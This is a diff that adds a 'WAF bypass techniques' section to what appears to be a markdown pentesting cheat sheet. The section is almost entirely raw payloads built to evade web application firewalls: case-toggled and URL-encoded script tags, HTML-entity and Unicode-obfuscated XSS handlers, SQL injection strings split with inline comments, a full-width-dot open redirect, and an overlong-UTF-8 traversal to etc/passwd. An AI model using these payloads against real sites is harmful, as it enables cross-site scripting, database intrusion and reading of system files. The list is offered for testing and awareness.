@@ -739,3 +739,41 @@ exit_url
 destination
 url
 ```
+
+## WAF bypass techniques (Great examples taken from the following link: https://github.com/0xInfection/Awesome-WAF#how-wafs-work).
+
+`%09`  
+`%0d`  
+`%00`  
+`%20`  
+`\`  
+
+#### Case Toggling
+`<ScRipT>alert()</sCRipT>`
+
+#### url encoding
+`%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e`
+
+#### url encoding + Case Toggling
+`uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29`
+
+#### Unicode
+`<marquee onstart=\u0070r\u06f\u006dpt()>`
+
+Alternative Unicode
+
+`/?redir=http://google。com`
+
+`＜marquee loop＝1 onfinish＝alert︵1)>x`
+
+`%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`
+
+#### HTML
+
+`&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;`  
+`&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;`  
+
+#### Commenting
+`<!--><script>alert/**/()/**/</script>`
+
+`/?id=1+un/**/ion+sel/**/ect+1,2,3--`
